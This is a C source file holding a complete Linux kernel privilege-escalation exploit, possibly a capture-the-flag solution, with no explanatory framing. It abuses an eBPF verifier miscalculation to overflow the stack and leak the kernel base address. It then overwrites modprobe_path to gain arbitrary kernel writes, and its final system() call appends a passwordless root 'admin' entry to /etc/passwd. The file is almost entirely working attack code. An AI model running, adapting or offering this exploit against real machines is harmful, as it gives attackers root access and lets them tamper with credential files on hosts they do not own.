#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>

#include <linux/bpf.h>
#include "filter.h"
#include "bpf_helper.h"

#define BASE			0xffffffff81000000
#define OFFSET(addr)	((addr) - (BASE))
#define ADDR(offset)	(kernel_base + (offset))

uint64_t kernel_base                     = 0;
uint64_t ofs_skb_copy_datagram_from_iter = OFFSET(0xffffffff81558340);
uint64_t ofs_modprobe_path               = OFFSET(0xffffffff81e38340);

int map_fd;
int socks[2];

/*
static uint64_t aar64(uint64_t addr){
	int prog_fd;
	uint64_t value;

	bpf_update_elem(map_fd, 0x0, (uint64_t[1]){0x8}, BPF_ANY);

	struct bpf_insn prog[] = {
		// R9 = ctx
		BPF_MOV64_REG(BPF_REG_9, BPF_REG_ARG1),

		// key = 0; map_lookup_elem(mapfd, &key)
		BPF_ST_MEM(BPF_DW, BPF_REG_FP, -0x08, 0x0),
		BPF_LD_MAP_FD(BPF_REG_ARG1, map_fd),
		BPF_MOV64_REG(BPF_REG_ARG2, BPF_REG_FP),
		BPF_ALU64_IMM(BPF_ADD, BPF_REG_ARG2, -0x08),
		BPF_EMIT_CALL(BPF_FUNC_map_lookup_elem),
		BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),
		BPF_EXIT_INSN(),

		// R7 = &map[0]; R8 = map[0]; *(fp-0x08) = map[0]
		BPF_MOV64_REG(BPF_REG_7, BPF_REG_0),
		BPF_LDX_MEM(BPF_DW, BPF_REG_8, BPF_REG_0, 0),
		BPF_STX_MEM(BPF_DW, BPF_REG_FP, BPF_REG_0, -0x08),

		// exploit: R8 = 0x10 (est:0x08)
		BPF_MOV64_IMM(BPF_REG_0, 32),
		BPF_ALU32_REG(BPF_LSH, BPF_REG_8, BPF_REG_0),
		BPF_ALU64_IMM(BPF_ADD, BPF_REG_8, 8),

		// skb_load_bytes(ctx, 0, fp-0x10, 0x10)
		BPF_MOV64_REG(BPF_REG_ARG1, BPF_REG_9),
		BPF_MOV64_IMM(BPF_REG_ARG2, 0),
		BPF_MOV64_REG(BPF_REG_ARG3, BPF_REG_FP),
		BPF_ALU64_IMM(BPF_ADD, BPF_REG_ARG3, -0x10),
		BPF_MOV64_REG(BPF_REG_ARG4, BPF_REG_8),
		BPF_EMIT_CALL(BPF_FUNC_skb_load_bytes),
	
		// map[0] = **(fp-0x08)
		BPF_LDX_MEM(BPF_DW, BPF_REG_0, BPF_REG_FP, -0x08),
		BPF_LDX_MEM(BPF_DW, BPF_REG_1, BPF_REG_0, 0),
		BPF_STX_MEM(BPF_DW, BPF_REG_7, BPF_REG_1, 0),

		BPF_MOV64_IMM(BPF_REG_0, 0),
		BPF_EXIT_INSN(),
	};

	if((prog_fd = bpf_prog_load(BPF_PROG_TYPE_SOCKET_FILTER, prog, sizeof(prog)/sizeof(struct bpf_insn))) < 0){
		return -1;
	}

	setsockopt(socks[0], SOL_SOCKET, SO_ATTACH_BPF, &prog_fd, sizeof(prog_fd));
	write(socks[1], (uint64_t[2]){0xdeadbeef, addr}, 0x10);
	setsockopt(socks[0], SOL_SOCKET, SO_DETACH_BPF, 0, 0);

	if(bpf_log_level > 0)
		puts(bpf_log_buf);

	bpf_lookup_elem(map_fd, 0, &value);

	return value;
}
 */

static void aaw64(uint64_t addr, uint64_t value){
	int prog_fd;

	bpf_update_elem(map_fd, 0x0, (uint64_t[1]){0x8}, BPF_ANY);

	struct bpf_insn prog[] = {
		// R9 = ctx
		BPF_MOV64_REG(BPF_REG_9, BPF_REG_ARG1),

		// key = 0; map_lookup_elem(mapfd, &key)
		BPF_ST_MEM(BPF_DW, BPF_REG_FP, -0x08, 0x0),
		BPF_LD_MAP_FD(BPF_REG_ARG1, map_fd),
		BPF_MOV64_REG(BPF_REG_ARG2, BPF_REG_FP),
		BPF_ALU64_IMM(BPF_ADD, BPF_REG_ARG2, -0x08),
		BPF_EMIT_CALL(BPF_FUNC_map_lookup_elem),
		BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),
		BPF_EXIT_INSN(),

		// R8 = map[0]; *(fp-0x08) = map[0]
		BPF_LDX_MEM(BPF_DW, BPF_REG_8, BPF_REG_0, 0),
		BPF_STX_MEM(BPF_DW, BPF_REG_FP, BPF_REG_0, -0x08),

		// exploit: R8 = 0x10 (est:0x08)
		BPF_MOV64_IMM(BPF_REG_0, 32),
		BPF_ALU32_REG(BPF_LSH, BPF_REG_8, BPF_REG_0),
		BPF_ALU64_IMM(BPF_ADD, BPF_REG_8, 8),

		// skb_load_bytes(ctx, 0, fp-0x10, 0x10)
		BPF_MOV64_REG(BPF_REG_ARG1, BPF_REG_9),
		BPF_MOV64_IMM(BPF_REG_ARG2, 0),
		BPF_MOV64_REG(BPF_REG_ARG3, BPF_REG_FP),
		BPF_ALU64_IMM(BPF_ADD, BPF_REG_ARG3, -0x10),
		BPF_MOV64_REG(BPF_REG_ARG4, BPF_REG_8),
		BPF_EMIT_CALL(BPF_FUNC_skb_load_bytes),
	
		// **(fp-0x08) = *(fp-0x10)
		BPF_LDX_MEM(BPF_DW, BPF_REG_0, BPF_REG_FP, -0x08),
		BPF_LDX_MEM(BPF_DW, BPF_REG_1, BPF_REG_FP, -0x10),
		BPF_STX_MEM(BPF_DW, BPF_REG_0, BPF_REG_1, 0),

		BPF_MOV64_IMM(BPF_REG_0, 0),
		BPF_EXIT_INSN(),
	};

	if((prog_fd = bpf_prog_load(BPF_PROG_TYPE_SOCKET_FILTER, prog, sizeof(prog)/sizeof(struct bpf_insn))) < 0){
		return;
	}

	setsockopt(socks[0], SOL_SOCKET, SO_ATTACH_BPF, &prog_fd, sizeof(prog_fd));
	write(socks[1], (uint64_t[2]){value, addr}, 0x10);
	setsockopt(socks[0], SOL_SOCKET, SO_DETACH_BPF, 0, 0);

	if(bpf_log_level > 0)
		puts(bpf_log_buf);
}

static void leak_kernel_base(void){
	int prog_fd;
	uint64_t value;

	bpf_update_elem(map_fd, 0x0, (uint64_t[1]){0x1}, BPF_ANY);

	struct bpf_insn prog[] = {
		// R9 = ctx
		BPF_MOV64_REG(BPF_REG_9, BPF_REG_ARG1),

		// key = 0; map_lookup_elem(mapfd, &key)
		BPF_ST_MEM(BPF_DW, BPF_REG_FP, -0x08, 0x0),
		BPF_LD_MAP_FD(BPF_REG_ARG1, map_fd),
		BPF_MOV64_REG(BPF_REG_ARG2, BPF_REG_FP),
		BPF_ALU64_IMM(BPF_ADD, BPF_REG_ARG2, -0x08),
		BPF_EMIT_CALL(BPF_FUNC_map_lookup_elem),
		BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),
		BPF_EXIT_INSN(),

		// R7 = &map[0]; R8 = map[0]; *(fp-0x08) = fp; *(fp-0x28) = 0
		BPF_MOV64_REG(BPF_REG_7, BPF_REG_0),
		BPF_LDX_MEM(BPF_DW, BPF_REG_8, BPF_REG_0, 0),
		BPF_STX_MEM(BPF_DW, BPF_REG_FP, BPF_REG_FP, -0x08),
		BPF_ST_MEM(BPF_DW, BPF_REG_FP, -0x28, 0),

		// exploit: R8 = 0x09 (est:0x08)
		BPF_MOV64_IMM(BPF_REG_0, 32),
		BPF_ALU32_REG(BPF_LSH, BPF_REG_8, BPF_REG_0),
		BPF_ALU64_IMM(BPF_ADD, BPF_REG_8, 8),

		// skb_load_bytes(ctx, 0, fp-0x10, 0x09)
		// overwrite stack address upper byte by 0xf0
		BPF_MOV64_REG(BPF_REG_ARG1, BPF_REG_9),
		BPF_MOV64_IMM(BPF_REG_ARG2, 0),
		BPF_MOV64_REG(BPF_REG_ARG3, BPF_REG_FP),
		BPF_ALU64_IMM(BPF_ADD, BPF_REG_ARG3, -0x10),
		BPF_MOV64_REG(BPF_REG_ARG4, BPF_REG_8),
		BPF_EMIT_CALL(BPF_FUNC_skb_load_bytes),

		// map[0] = *((*(fp-0x08)&~0xff+0xf0)-0x28)
		BPF_LDX_MEM(BPF_DW, BPF_REG_0, BPF_REG_FP, -0x08),
		BPF_LDX_MEM(BPF_DW, BPF_REG_1, BPF_REG_0, -0x28),
		BPF_STX_MEM(BPF_DW, BPF_REG_7, BPF_REG_1, 0),
	
		BPF_MOV64_IMM(BPF_REG_0, 1),
		BPF_EXIT_INSN(),
	};

	prog_fd = bpf_prog_load(BPF_PROG_TYPE_SOCKET_FILTER, prog, sizeof(prog)/sizeof(struct bpf_insn));

	setsockopt(socks[0], SOL_SOCKET, SO_ATTACH_BPF, &prog_fd, sizeof(prog_fd));
	write(socks[1], "AAAAAAAA\xf0", 9);
	setsockopt(socks[0], SOL_SOCKET, SO_DETACH_BPF, 0, 0);

	if(bpf_log_level > 0)
		puts(bpf_log_buf);

	bpf_lookup_elem(map_fd, 0, &value);
	printf("[+]leaked: %#lx\n", value);

	uint64_t adr_skb_copy_datagram_from_iter = value - 0x5d;
	kernel_base = adr_skb_copy_datagram_from_iter - ofs_skb_copy_datagram_from_iter;
	printf("[+]kernel_base = %#lx\n", kernel_base);
}

int main(void){
	bpf_log_level = 1;

	if((map_fd = bpf_create_map(BPF_MAP_TYPE_ARRAY, sizeof(uint64_t), 0x10)) < 0){
		return -1;
	}
	socketpair(AF_UNIX, SOCK_DGRAM, 0, socks);

	leak_kernel_base();
	aaw64(ADDR(ofs_modprobe_path), *(uint64_t*)"/tmp/mp");

	close(map_fd);

	system(	"cd /tmp; "
			"echo -e '#!/bin/sh\\necho admin::0:0::/root:/bin/sh >> /etc/passwd' > mp; "
			"chmod +x mp; "

			"echo -ne '\xff\xff\xff\xff' > a; "
			"chmod +x a; "
			"./a; "
			"rm mp a;"
	);

	puts("[+]added user 'admin'");
	puts("[*]run 'su admin -'");
}
